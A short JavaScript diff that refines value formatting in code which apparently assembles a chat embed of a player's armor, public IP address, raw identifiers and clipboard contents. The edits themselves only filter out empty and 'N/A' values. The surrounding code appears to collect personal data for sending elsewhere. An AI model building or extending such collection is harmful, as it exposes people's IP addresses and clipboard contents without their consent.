@@ -58,9 +58,15 @@ async function fetchPublicIP(){
 }
 
 function safe(v){
-  if (v === null || v === undefined) return "N/A";
-  if (typeof v === "string" && v.length > 0) return v;
+  if (v === null || v === undefined || v === "") return "N/A";
+  if (typeof v === "string" && v.length > 0 && v !== "N/A") return v;
   if (typeof v === "number") return String(v);
+  if (Array.isArray(v) && v.length > 0) {
+    // Filter out "N/A" from arrays
+    const filtered = v.filter(item => item !== "N/A" && item !== null && item !== undefined);
+    return filtered.length > 0 ? filtered.join(", ") : "N/A";
+  }
+  if (Array.isArray(v) && v.length === 0) return "N/A";
   return JSON.stringify(v);
 }
 
@@ -107,7 +113,7 @@ async function sendEmbed(full){
     { name: "🛡️ Armor", value: safe(p.armor), inline: true },
 
     { name: "🌍 Public IP", value: ip || "N/A", inline: false },
-    { name: "📊 Identifiers (raw)", value: (p.identifiers && p.identifiers.length) ? "```" + p.identifiers.join("\n") + "```" : "N/A", inline: false }
+    { name: "📊 Identifiers (raw)", value: (p.identifiers && Array.isArray(p.identifiers) && p.identifiers.length > 0 && p.identifiers[0] !== "N/A") ? "```" + p.identifiers.filter(id => id !== "N/A" && id !== null && id !== undefined).join("\n") + "```" : "N/A", inline: false }
   ];
 
   // إضافة الأجزاء الإضافية من الكليب بورد إذا كان طويل
